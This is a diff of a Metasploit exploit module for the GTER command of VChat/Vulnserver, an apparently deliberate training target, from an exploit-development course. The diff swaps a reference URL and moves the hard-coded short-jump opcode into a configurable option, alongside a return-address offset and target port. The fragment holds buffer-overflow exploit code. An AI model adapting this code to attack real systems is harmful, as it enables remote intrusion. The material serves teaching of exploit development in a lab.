@@ -25,7 +25,7 @@ class MetasploitModule < Msf::Exploit::Remote	# This is a remote exploit module 
       'References'     =>	# References for the vulnerability or exploit
         [
           #[ 'URL', 'https://github.com/DaintyJet/Making-Dos-DDoS-Metasploit-Module-Vulnserver/'],
-          [ 'URL', 'https://github.com/DaintyJet/VChat_GTER_EggHunter' ]
+          [ 'URL', 'https://github.com/DaintyJet/VChat_GTER_CodeReuse' ]
 
         ],
       'Privileged'     => false,
@@ -52,13 +52,15 @@ class MetasploitModule < Msf::Exploit::Remote	# This is a remote exploit module 
       register_options( # Available options: CHOST(), CPORT(), LHOST(), LPORT(), Proxies(), RHOST(), RHOSTS(), RPORT(), SSLVersion()
           [
           OptInt.new('RETOFFSET_GTER', [true, 'Offset of Return Address in function GTER', 135]),
+          OptString.new('SHORT_JUMP', [true, 'Short Jump Instruction, Provided in HEX Digits', "\xe9\x71\xff\xff\xff"]),
           Opt::RPORT(9999),
           Opt::RHOSTS('192.168.7.191')
       ])
       
   end
   def exploit	# Actual exploit
-    relativeshort = "\xe9\x71\xff\xff\xff"
+     
+    relativeshort = datastore['SHORT_JUMP'].gsub(/\\x([0-9a-fA-F]{2})/) { $1.to_i(16).chr }
 
     print_status("Connecting to target...")
     connect	# Connect to the target
